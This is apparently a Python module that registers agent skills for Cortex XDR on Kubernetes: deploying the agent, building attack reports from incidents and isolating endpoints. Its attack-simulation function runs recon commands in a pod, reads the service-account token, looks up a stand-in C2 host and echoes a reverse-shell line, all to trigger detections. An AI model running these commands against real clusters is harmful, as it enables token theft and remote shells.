"""
Cortex XDR integration (Feature 3).

Agent skills grouped into the three capabilities requested:

  1. Generate a Kubernetes deployment for the Cortex XDR agent — as a Helm
     values file + install commands AND a raw DaemonSet manifest.
  2. Pull Kubernetes-related issues/cases and generate an attack report.
  3. Respond by isolating (or scanning / un-isolating) the affected endpoint.

Plus connectivity probing, XQL, and the existing Helm-based live deploy + attack
simulation helpers. The same client is served over MCP (cortex/mcp_server.py).
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any

from sirius.config import load_config
from sirius.cortex.client import CortexClient, is_k8s_related
from sirius.events import emit
from sirius.skills import registry

_log = logging.getLogger("sirius.cortex")

# Where generated k8s artifacts are written.
K8S_OUT = Path(__file__).resolve().parents[2].parent / "terraform" / "eks" / "cortex-agent"


def _client() -> CortexClient:
    return CortexClient(load_config().cortex)


def _safe(action: str, fn):
    """Run a Cortex call, converting API/SBAC errors into a clear result dict."""
    from sirius.cortex.client import CortexError
    try:
        return fn()
    except CortexError as e:
        msg = str(e)
        sbac = "SBAC" in msg or "err_code\": 403" in msg or "HTTP 403" in msg
        hint = ("Your Cortex API key's role lacks the scope for this endpoint. In the "
                "Cortex console, edit the API key's role to include Endpoint "
                "Administrator / response-action permissions (SBAC).") if sbac else None
        emit("error", f"Cortex {action} blocked" + (" (SBAC)" if sbac else ""),
             severity="danger", payload={"error": msg[:300], "hint": hint})
        return {"ok": False, "error": msg[:300], "sbac_blocked": sbac, "hint": hint}


def _stream(cmd: list[str], phase: str, stdin: str | None = None) -> dict:
    # `stdin`, when given, is written to the process then closed before streaming
    # stdout — used for secrets like `helm ... --password-stdin` so the value
    # never appears in argv or the emitted command line.
    emit("terraform_step", f"$ {' '.join(cmd)}", payload={"phase": phase, "cmd": cmd})
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                stdin=subprocess.PIPE if stdin is not None else None,
                                text=True, bufsize=1, env=os.environ.copy())
    except FileNotFoundError:
        emit("error", f"{cmd[0]} not found on PATH", severity="danger")
        return {"ok": False, "error": f"{cmd[0]} not installed"}
    if stdin is not None and proc.stdin is not None:
        proc.stdin.write(stdin)
        proc.stdin.close()
    out: list[str] = []
    assert proc.stdout is not None
    for line in proc.stdout:
        line = line.rstrip()
        if line:
            out.append(line)
            emit("terraform_step", line,
                 severity="danger" if "error" in line.lower() else "info",
                 payload={"phase": phase})
    code = proc.wait()
    emit("terraform_step", f"{phase} exited {code}",
         severity="success" if code == 0 else "danger", payload={"phase": phase})
    return {"ok": code == 0, "exit_code": code, "output": "\n".join(out[-60:])}


# ── connectivity ──────────────────────────────────────────────────────────────
def cortex_test_connection(**_: Any) -> dict:
    c = _client()
    emit("skill_invoked", "Cortex XDR: test connection",
         payload={"fqdn": c.fqdn or "(none)", "mock": c.mock})
    res = c.test_connection()
    emit("status", f"Cortex connection: {'OK' if res.get('ok') else 'FAILED'}"
         + (f" (auth={res.get('auth_mode')})" if res.get("ok") else ""),
         severity="success" if res.get("ok") else "danger", payload=res)
    return res


# ── query skills ──────────────────────────────────────────────────────────────
def cortex_get_incidents(limit: int = 50, **_: Any) -> dict:
    emit("skill_invoked", "Cortex XDR: get incidents", payload={"limit": limit})
    return _client().get_incidents(limit)


def cortex_get_alerts(limit: int = 50, **_: Any) -> dict:
    emit("skill_invoked", "Cortex XDR: get alerts", payload={"limit": limit})
    return _client().get_alerts(limit)


def cortex_get_endpoints(limit: int = 100, **_: Any) -> dict:
    emit("skill_invoked", "Cortex XDR: get endpoints", payload={"limit": limit})
    return _safe("get_endpoints", lambda: _client().get_endpoints(limit))


def cortex_xql_query(query: str, timeframe_minutes: int = 60, **_: Any) -> dict:
    emit("skill_invoked", "Cortex XDR: XQL query", payload={"query": query})
    return _client().run_xql_query(query, timeframe_minutes)


# ── Capability 1: generate k8s deployment ──────────────────────────────────────
def cortex_generate_k8s_deployment(
    distribution_id: str = "",
    namespace: str = "cortex",
    cluster_name: str = "sirius-demo",
    image: str = "",
    **_: Any,
) -> dict:
    """Generate Cortex XDR Kubernetes agent artifacts: a Helm values.yaml + install
    commands AND a raw DaemonSet manifest. Writes them under
    terraform/eks/cortex-agent/ and returns their contents.

    distribution_id comes from your Cortex XDR console (Endpoints → Agent
    Installations → Kubernetes) or the CORTEX_DISTRIBUTION_ID env var.
    """
    distribution_id = distribution_id or os.environ.get("CORTEX_DISTRIBUTION_ID", "<DISTRIBUTION_ID>")
    image = image or os.environ.get("CORTEX_AGENT_IMAGE",
                                    "distributions.traps.paloaltonetworks.com/cortex-agent:latest")
    emit("skill_invoked", "Cortex XDR: generate k8s deployment",
         payload={"namespace": namespace, "cluster": cluster_name})

    values_yaml = f"""# Cortex XDR Kubernetes agent — Helm values (generated by Sirius)
# Install:
#   helm repo add cortex https://distributions.traps.paloaltonetworks.com/helm
#   helm repo update
#   helm upgrade --install cortex-agent cortex/cortex-agent \\
#       --namespace {namespace} --create-namespace -f values.yaml
distributionId: "{distribution_id}"
clusterName: "{cluster_name}"
image:
  repository: "{image.rsplit(':', 1)[0]}"
  tag: "{image.rsplit(':', 1)[-1] if ':' in image else 'latest'}"
# Run the agent on every node as a DaemonSet, plus a cluster-agent Deployment.
daemonset:
  enabled: true
clusterAgent:
  enabled: true
resources:
  requests: {{cpu: 100m, memory: 256Mi}}
  limits: {{cpu: 500m, memory: 512Mi}}
"""

    daemonset_yaml = f"""# Cortex XDR agent DaemonSet (generated by Sirius) — raw manifest alternative
apiVersion: v1
kind: Namespace
metadata:
  name: {namespace}
---
apiVersion: v1
kind: Secret
metadata:
  name: cortex-distribution
  namespace: {namespace}
type: Opaque
stringData:
  distribution-id: "{distribution_id}"
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: cortex-agent
  namespace: {namespace}
  labels: {{app: cortex-agent}}
spec:
  selector:
    matchLabels: {{app: cortex-agent}}
  template:
    metadata:
      labels: {{app: cortex-agent}}
    spec:
      hostPID: true
      hostNetwork: true
      tolerations:
        - operator: Exists            # schedule on every node incl. control-plane
      containers:
        - name: cortex-agent
          image: {image}
          securityContext:
            privileged: true          # host-level visibility for the agent
          env:
            - name: CLUSTER_NAME
              value: "{cluster_name}"
            - name: DISTRIBUTION_ID
              valueFrom:
                secretKeyRef: {{name: cortex-distribution, key: distribution-id}}
          volumeMounts:
            - {{name: host-root, mountPath: /host, readOnly: true}}
          resources:
            requests: {{cpu: 100m, memory: 256Mi}}
            limits: {{cpu: 500m, memory: 512Mi}}
      volumes:
        - name: host-root
          hostPath: {{path: /}}
"""

    K8S_OUT.mkdir(parents=True, exist_ok=True)
    (K8S_OUT / "values.yaml").write_text(values_yaml, encoding="utf-8")
    (K8S_OUT / "daemonset.yaml").write_text(daemonset_yaml, encoding="utf-8")
    emit("status", f"Wrote Helm values + DaemonSet manifest to {K8S_OUT}",
         severity="success", payload={"path": str(K8S_OUT)})

    return {
        "ok": True,
        "output_dir": str(K8S_OUT),
        "files": ["values.yaml", "daemonset.yaml"],
        "helm_commands": [
            "helm repo add cortex https://distributions.traps.paloaltonetworks.com/helm",
            "helm repo update",
            f"helm upgrade --install cortex-agent cortex/cortex-agent "
            f"--namespace {namespace} --create-namespace -f {K8S_OUT}/values.yaml",
        ],
        "kubectl_command": f"kubectl apply -f {K8S_OUT}/daemonset.yaml",
        "note": ("distribution_id must come from your Cortex XDR console "
                 "(Endpoints → Agent Installations → Kubernetes) or CORTEX_DISTRIBUTION_ID."),
        "values_yaml": values_yaml,
        "daemonset_yaml": daemonset_yaml,
    }


# ── agent distributions (get the distribution_id programmatically) ──────────────
def cortex_get_distribution_versions(**_: Any) -> dict:
    """List available Cortex agent versions per platform."""
    emit("skill_invoked", "Cortex XDR: get distribution versions")
    return _safe("get_distribution_versions",
                 lambda: _client().get_distribution_versions())


def cortex_create_distribution(name: str, platform: str = "linux",
                               package_type: str = "standalone",
                               agent_version: str = "", **_: Any) -> dict:
    """Create a Cortex agent distribution and return its distribution_id.

    Feeds cortex_generate_k8s_deployment / the k8s install so the distribution_id
    no longer has to be copied from the console by hand.

    Endpoint installers (e.g. platform="windows", package_type="standalone",
    agent_version set) are verified live via `distributions/create`. For the k8s
    path, confirm the returned id is the one the Helm chart expects against a live
    tenant. Runs in mock mode without CORTEX_FQDN/CORTEX_API_KEY.
    """
    emit("skill_invoked", f"Cortex XDR: create distribution {name}",
         payload={"platform": platform, "package_type": package_type})
    res = _safe("create_distribution",
                lambda: _client().create_distribution(name, platform, package_type,
                                                      agent_version))
    if isinstance(res, dict) and res.get("distribution_id"):
        emit("status", f"Distribution created: {res['distribution_id']}",
             severity="success", payload={"distribution_id": res["distribution_id"]})
    return res


def _distribution_download_dir(dest_dir: str = "") -> Path:
    """Resolve the installer download dir (explicit arg → config), relative to
    the backend root when not absolute. Mirrors _resolve_konnector_profile."""
    d = Path(dest_dir or load_config().cortex.distribution_download_dir)
    if not d.is_absolute():
        d = Path(__file__).resolve().parents[2] / d
    return d


def cortex_download_distribution(distribution_id: str = "", package_type: str = "x64",
                                 dest_dir: str = "", name: str = "",
                                 platform: str = "windows", agent_version: str = "",
                                 **_: Any) -> dict:
    """Create (optional) → poll → download a Cortex agent installer in one call.

    Give an existing `distribution_id` to download it, OR give `name` (+ platform +
    agent_version) to create a new standalone package first. agent_version is
    required to create — list options with cortex_get_distribution_versions.

    `distributions/create` is async, so this polls until the package finishes
    building, then downloads the signed URL (which needs the API auth headers).
    Files land in cortex.distribution_download_dir (relative to the backend root)
    unless dest_dir is given. package_type: x64/x86/arm64 (Windows MSI), sh/rpm/deb
    (Linux), pkg (macOS). Runs in mock mode without CORTEX_FQDN/CORTEX_API_KEY.
    """
    c = _client()
    if not distribution_id:
        if not name:
            return {"ok": False, "error": "provide distribution_id, or name to create one"}
        emit("skill_invoked", f"Cortex XDR: create distribution {name}",
             payload={"platform": platform, "package_type": "standalone",
                      "agent_version": agent_version})
        created = _safe("create_distribution",
                        lambda: c.create_distribution(name, platform, "standalone",
                                                      agent_version))
        if not (isinstance(created, dict) and created.get("distribution_id")):
            return created if isinstance(created, dict) else {"ok": False,
                                                              "error": "create failed"}
        distribution_id = created["distribution_id"]
        emit("status", f"Distribution created: {distribution_id} (building…)",
             severity="success", payload={"distribution_id": distribution_id})

    dest = _distribution_download_dir(dest_dir)
    emit("skill_invoked", f"Cortex XDR: download distribution {distribution_id}",
         payload={"package_type": package_type, "dest_dir": str(dest)})
    res = _safe("download_distribution",
                lambda: c.download_distribution(distribution_id, str(dest), package_type))
    if isinstance(res, dict) and res.get("ok"):
        emit("status",
             f"Installer downloaded: {res.get('path')} ({res.get('bytes', 0):,} bytes)",
             severity="success",
             payload={"path": res.get("path"), "bytes": res.get("bytes"),
                      "distribution_id": distribution_id})
    return res


# ── Capability 2: k8s issues + attack report ────────────────────────────────────
def cortex_k8s_incidents(limit: int = 50, **_: Any) -> dict:
    """Pull incidents and return only the Kubernetes-related ones."""
    emit("skill_invoked", "Cortex XDR: k8s-related incidents", payload={"limit": limit})
    data = _client().get_incidents(limit)
    incs = data.get("incidents", [])
    k8s = [i for i in incs if is_k8s_related(i)]
    emit("status", f"{len(k8s)}/{len(incs)} incidents are Kubernetes-related",
         payload={"k8s": len(k8s), "total": len(incs)})
    return {"total": len(incs), "k8s_related": len(k8s), "incidents": k8s}


def cortex_k8s_attack_report(limit: int = 50, max_incidents: int = 5, **_: Any) -> str:
    """Pull k8s-related incidents + their alerts and produce a markdown attack report."""
    emit("skill_invoked", "Cortex XDR: generate k8s attack report", payload={"limit": limit})
    c = _client()
    incs = [i for i in c.get_incidents(limit).get("incidents", []) if is_k8s_related(i)]
    incs = incs[:max_incidents]

    lines = ["# Cortex XDR — Kubernetes Attack Report", ""]
    lines.append(f"Kubernetes-related incidents: **{len(incs)}**")
    lines.append("")
    affected_endpoints: dict[str, str] = {}

    if not incs:
        lines.append("_No Kubernetes-related incidents found._")

    for inc in incs:
        iid = inc.get("incident_id", "?")
        lines += [
            f"## Incident {iid} — severity: {inc.get('severity','?')} ({inc.get('status','?')})",
            f"- **Description:** {inc.get('description','')}",
            f"- **Hosts:** {', '.join(inc.get('hosts', []) or [])}",
            f"- **Alerts:** {inc.get('alert_count','?')}",
            "",
        ]
        try:
            extra = c.get_incident_extra_data(iid)
        except Exception as e:  # noqa: BLE001
            lines.append(f"  _could not fetch alerts: {e}_\n")
            extra = {}
        alerts = (extra.get("alerts") or {}).get("data", [])
        if alerts:
            lines += ["| Alert | Severity | MITRE | Host | Command line |",
                      "|---|---|---|---|---|"]
            for a in alerts:
                host = a.get("host_name", "")
                ep = a.get("endpoint_id")
                if ep:
                    affected_endpoints[ep] = host
                cmd = (a.get("action_process_image_command_line") or "").replace("|", "\\|")[:80]
                lines.append(
                    f"| {a.get('name','')} | {a.get('severity','')} | "
                    f"{a.get('mitre_tactic_id_and_name','')} | {host} | `{cmd}` |")
            lines.append("")

    if affected_endpoints:
        lines += ["## Affected endpoints (containment candidates)", ""]
        for ep, host in affected_endpoints.items():
            lines.append(f"- `{ep}` ({host}) — isolate with "
                         f"`cortex_isolate_endpoint(endpoint_id=\"{ep}\")`")
        lines.append("")

    lines += ["## Recommended response", "",
              "1. Isolate the affected endpoint(s) above to contain lateral movement.",
              "2. Trigger an endpoint scan for residual artifacts.",
              "3. Rotate any Kubernetes service-account tokens that were accessed.",
              "4. Review the pod's securityContext (privileged / hostPath) and restrict it."]
    report = "\n".join(lines)
    emit("scan_finding", f"k8s attack report generated ({len(incs)} incidents, "
         f"{len(affected_endpoints)} endpoints)", severity="warn",
         payload={"endpoints": affected_endpoints})
    return report


# ── Capability 3: response / isolation ──────────────────────────────────────────
def cortex_isolate_endpoint(endpoint_id: str, **_: Any) -> dict:
    """Isolate the affected endpoint (the node/host running the compromised container)."""
    emit("skill_invoked", f"Cortex XDR: ISOLATE endpoint {endpoint_id}",
         severity="warn", payload={"endpoint_id": endpoint_id})
    res = _safe("isolate_endpoint", lambda: _client().isolate_endpoint(endpoint_id))
    if res.get("ok") is not False:
        emit("status", f"Isolation requested for {endpoint_id}", severity="warn", payload=res)
    return res


def cortex_unisolate_endpoint(endpoint_id: str, **_: Any) -> dict:
    emit("skill_invoked", f"Cortex XDR: un-isolate endpoint {endpoint_id}",
         payload={"endpoint_id": endpoint_id})
    return _safe("unisolate_endpoint", lambda: _client().unisolate_endpoint(endpoint_id))


def cortex_scan_endpoint(endpoint_id: str, **_: Any) -> dict:
    emit("skill_invoked", f"Cortex XDR: scan endpoint {endpoint_id}",
         payload={"endpoint_id": endpoint_id})
    return _safe("scan_endpoint", lambda: _client().scan_endpoint(endpoint_id))


# ── live deploy + attack simulation (unchanged helpers) ────────────────────────
def cortex_deploy_k8s_connector(cluster_name: str, region: str = "",
                                namespace: str = "cortex", distribution_id: str = "",
                                **_: Any) -> dict:
    """Deploy the Cortex XDR Kubernetes agent via Helm onto an EKS cluster."""
    region = region or os.environ.get("AWS_REGION", "ap-southeast-1")
    if not shutil.which("helm") or not shutil.which("kubectl"):
        return {"ok": False, "error": "helm and kubectl must be installed"}
    gen = cortex_generate_k8s_deployment(distribution_id=distribution_id,
                                         namespace=namespace, cluster_name=cluster_name)
    emit("skill_invoked", f"Deploy Cortex k8s agent to {cluster_name}",
         severity="warn", payload={"cluster": cluster_name, "namespace": namespace})
    _stream(["aws", "eks", "update-kubeconfig", "--name", cluster_name,
             "--region", region], "kubeconfig")
    _stream(["helm", "repo", "add", "cortex",
             "https://distributions.traps.paloaltonetworks.com/helm"], "helm-repo")
    _stream(["helm", "repo", "update"], "helm-update")
    res = _stream(["helm", "upgrade", "--install", "cortex-agent", "cortex/cortex-agent",
                   "--namespace", namespace, "--create-namespace",
                   "-f", f"{gen['output_dir']}/values.yaml"], "helm-install")
    if res.get("ok"):
        emit("status", "Cortex k8s agent deployed. Agents will register shortly.",
             severity="success")
    return res


# ── Cortex Cloud KSPM konnector + XDR runtime agent (OCI helm chart) ─────────────
def _resolve_konnector_profile(profile_dir: str = "", auth_json: str = "",
                               values_file: str = "") -> tuple[str, str]:
    """Locate the downloaded profile pair (*.auth.json + *.values.yaml).

    Order: explicit args → given profile_dir → config.cortex.konnector_profile_dir
    (resolved relative to the backend root). Raises FileNotFoundError if a unique
    pair can't be found.
    """
    backend_root = Path(__file__).resolve().parents[2]
    if not (auth_json and values_file):
        d = Path(profile_dir or load_config().cortex.konnector_profile_dir)
        if not d.is_absolute():
            d = backend_root / d
        if not d.is_dir():
            raise FileNotFoundError(f"konnector profile dir not found: {d}")
        auths = sorted(d.glob("*.auth.json"))
        vals = sorted(d.glob("*.values.yaml"))
        if len(auths) != 1 or len(vals) != 1:
            raise FileNotFoundError(
                f"expected exactly one *.auth.json and one *.values.yaml in {d}; "
                f"found {len(auths)} auth / {len(vals)} values")
        auth_json, values_file = str(auths[0]), str(vals[0])
    if not Path(auth_json).is_file() or not Path(values_file).is_file():
        raise FileNotFoundError(f"profile files missing: {auth_json} / {values_file}")
    return auth_json, values_file


def cortex_deploy_k8s_konnector(cluster_name: str, region: str = "", namespace: str = "",
                                profile_dir: str = "", auth_json: str = "",
                                values_file: str = "", release: str = "konnector",
                                **_: Any) -> dict:
    """Install the Cortex Cloud KSPM konnector + XDR runtime agent on an EKS cluster
    from a downloaded k8s security-profile pair, repeatably.

    Everything tenant-specific is derived from the profile's values.yaml
    (imageRegistry -> registry host + OCI chart ref; global.namespace). The pair is
    reusable across clusters/installs in the same tenant (until the pull key rotates).

    Requires helm/kubectl/aws on PATH and AWS creds in the backend's environment
    (AWS_PROFILE / keys) so the subprocesses can reach EKS. Idempotent
    (helm upgrade --install).
    """
    import yaml  # local import: only needed here, keeps module import light

    region = region or os.environ.get("AWS_REGION", "ap-southeast-1")
    for b in ("helm", "kubectl", "aws"):
        if not shutil.which(b):
            return {"ok": False, "error": f"{b} not installed"}
    try:
        auth_json, values_file = _resolve_konnector_profile(profile_dir, auth_json, values_file)
    except FileNotFoundError as e:
        emit("error", f"Konnector profile not found: {e}", severity="danger")
        return {"ok": False, "error": str(e)}

    cfg = yaml.safe_load(Path(values_file).read_text(encoding="utf-8")) or {}
    g = cfg.get("global", {}) or {}
    image_registry = str(g.get("imageRegistry", "")).rstrip("/")
    if not image_registry:
        return {"ok": False, "error": "values.yaml missing global.imageRegistry"}
    namespace = namespace or g.get("namespace") or "panw"
    registry_host = image_registry.split("/")[0]
    chart_ref = f"oci://{image_registry}/helm/konnector-launcher"

    emit("skill_invoked", f"Deploy Cortex KSPM konnector + XDR runtime to {cluster_name}",
         severity="warn", payload={"cluster": cluster_name, "namespace": namespace,
                                   "chart": chart_ref})

    kc = _stream(["aws", "eks", "update-kubeconfig", "--name", cluster_name,
                  "--region", region], "kubeconfig")
    if not kc.get("ok"):
        return {"ok": False, "step": "kubeconfig", "output": kc.get("output", kc.get("error"))}

    # Registry login — GCP key piped via stdin, never in argv/logs.
    key = Path(auth_json).read_text(encoding="utf-8")
    login = _stream(["helm", "registry", "login", registry_host,
                     "--username", "_json_key", "--password-stdin"], "registry-login", stdin=key)
    if not login.get("ok"):
        return {"ok": False, "step": "registry-login", "output": login.get("output")}

    res = _stream(["helm", "upgrade", "--install", release, chart_ref,
                   "--wait-for-jobs", "--create-namespace", "--namespace", namespace,
                   "--values", values_file,
                   "--set-file", f"konnector-upgrader.rawValuesContent={values_file}"],
                  "helm-install")
    _stream(["kubectl", "get", "pods", "-n", namespace], "verify")
    if res.get("ok"):
        emit("status", f"Cortex konnector installed in '{namespace}' on {cluster_name}.",
             severity="success", payload={"release": release, "namespace": namespace})
    return {"ok": res.get("ok", False), "release": release, "namespace": namespace,
            "cluster": cluster_name, "chart": chart_ref, "output": res.get("output")}


def cortex_attack_simulation(namespace: str = "default", target_pod: str = "", **_: Any) -> dict:
    """Run a standard, DETECTABLE attack simulation inside the cluster."""
    if not shutil.which("kubectl"):
        return {"ok": False, "error": "kubectl not installed"}
    emit("skill_invoked", "Cortex attack simulation (kubectl exec)",
         severity="warn", payload={"namespace": namespace})
    if not target_pod:
        out = subprocess.run(
            ["kubectl", "get", "pods", "-n", namespace, "-o",
             "jsonpath={.items[0].metadata.name}"],
            capture_output=True, text=True, env=os.environ.copy())
        target_pod = out.stdout.strip()
    if not target_pod:
        return {"ok": False, "error": f"no pods found in namespace {namespace}"}
    sims = [
        ("recon", "id; uname -a; cat /etc/os-release"),
        ("sa-token-read", "cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40"),
        ("fake-c2-dns", "getent hosts malicious-c2.example.com || true"),
        ("reverse-shell-pattern", "echo 'sh -i >& /dev/tcp/10.0.9.9/4444 0>&1' # simulated"),
    ]
    results = {}
    for name, cmd in sims:
        emit("scan_finding", f"[attack-sim:{name}] {cmd}", severity="warn",
             payload={"sim": name, "pod": target_pod})
        r = _stream(["kubectl", "exec", "-n", namespace, target_pod, "--", "sh", "-c", cmd],
                    f"sim-{name}")
        results[name] = r.get("output", "")
    emit("status", "Attack simulation complete — check Cortex XDR for new alerts.",
         severity="success")
    return {"ok": True, "pod": target_pod, "simulations": list(results), "results": results}


# ── register skills ─────────────────────────────────────────────────────────────
_EMPTY = {"type": "object", "properties": {}}
_LIMIT = {"type": "object", "properties": {"limit": {"type": "integer"}}}
_EP = {"type": "object", "properties": {"endpoint_id": {"type": "string"}},
       "required": ["endpoint_id"]}

registry.skill("cortex_test_connection", "Probe Cortex XDR connectivity + auth mode.", _EMPTY)(cortex_test_connection)
registry.skill("cortex_get_incidents", "List recent Cortex XDR incidents.", _LIMIT)(cortex_get_incidents)
registry.skill("cortex_get_alerts", "List recent Cortex XDR alerts.", _LIMIT)(cortex_get_alerts)
registry.skill("cortex_get_endpoints", "List Cortex XDR endpoints/agents.", _LIMIT)(cortex_get_endpoints)
registry.skill("cortex_k8s_incidents", "List only Kubernetes-related Cortex XDR incidents.", _LIMIT)(cortex_k8s_incidents)
registry.skill("cortex_k8s_attack_report",
               "Generate a markdown attack report from Kubernetes-related incidents + alerts.",
               {"type": "object", "properties": {"limit": {"type": "integer"},
                                                 "max_incidents": {"type": "integer"}}})(cortex_k8s_attack_report)
registry.skill("cortex_isolate_endpoint", "Isolate the endpoint running an affected container.", _EP)(cortex_isolate_endpoint)
registry.skill("cortex_unisolate_endpoint", "Remove isolation from an endpoint.", _EP)(cortex_unisolate_endpoint)
registry.skill("cortex_scan_endpoint", "Trigger a malware scan on an endpoint.", _EP)(cortex_scan_endpoint)
registry.skill("cortex_xql_query", "Run a Cortex XQL query and return results.",
               {"type": "object", "properties": {"query": {"type": "string"},
                                                 "timeframe_minutes": {"type": "integer"}},
                "required": ["query"]})(cortex_xql_query)
registry.skill("cortex_generate_k8s_deployment",
               "Generate Cortex XDR k8s agent deployment (Helm values + DaemonSet manifest).",
               {"type": "object", "properties": {"distribution_id": {"type": "string"},
                                                 "namespace": {"type": "string"},
                                                 "cluster_name": {"type": "string"},
                                                 "image": {"type": "string"}}})(cortex_generate_k8s_deployment)
registry.skill("cortex_get_distribution_versions",
               "List available Cortex agent versions per platform.", _EMPTY)(cortex_get_distribution_versions)
registry.skill("cortex_create_distribution",
               "Create a Cortex agent distribution and return its distribution_id (feeds k8s deploy).",
               {"type": "object", "properties": {"name": {"type": "string"},
                                                 "platform": {"type": "string"},
                                                 "package_type": {"type": "string"},
                                                 "agent_version": {"type": "string"}},
                "required": ["name"]})(cortex_create_distribution)
registry.skill("cortex_download_distribution",
               "Create (optional) → poll → download a Cortex agent installer "
               "(e.g. Windows MSI) in one call. Give distribution_id to download an "
               "existing package, or name+platform+agent_version to create then download.",
               {"type": "object", "properties": {"distribution_id": {"type": "string"},
                                                 "package_type": {"type": "string"},
                                                 "dest_dir": {"type": "string"},
                                                 "name": {"type": "string"},
                                                 "platform": {"type": "string"},
                                                 "agent_version": {"type": "string"}}}
               )(cortex_download_distribution)
registry.skill("cortex_deploy_k8s_connector",
               "LEGACY — needs the Cortex distribution API (often HTTP 500 and a "
               "non-existent helm repo). Prefer cortex_deploy_k8s_konnector, which "
               "installs from the downloaded security profile and needs no API.",
               {"type": "object", "properties": {"cluster_name": {"type": "string"},
                                                 "region": {"type": "string"},
                                                 "namespace": {"type": "string"},
                                                 "distribution_id": {"type": "string"}},
                "required": ["cluster_name"]})(cortex_deploy_k8s_connector)
registry.skill("cortex_deploy_k8s_konnector",
               "Install the Cortex Cloud KSPM konnector + XDR runtime agent on an EKS "
               "cluster from a downloaded k8s security-profile pair (repeatable, idempotent).",
               {"type": "object", "properties": {"cluster_name": {"type": "string"},
                                                 "region": {"type": "string"},
                                                 "namespace": {"type": "string"},
                                                 "profile_dir": {"type": "string"},
                                                 "release": {"type": "string"}},
                "required": ["cluster_name"]})(cortex_deploy_k8s_konnector)
registry.skill("cortex_attack_simulation",
               "Run a standard detectable attack simulation against the vulnerable demo pods.",
               {"type": "object", "properties": {"namespace": {"type": "string"},
                                                 "target_pod": {"type": "string"}}})(cortex_attack_simulation)
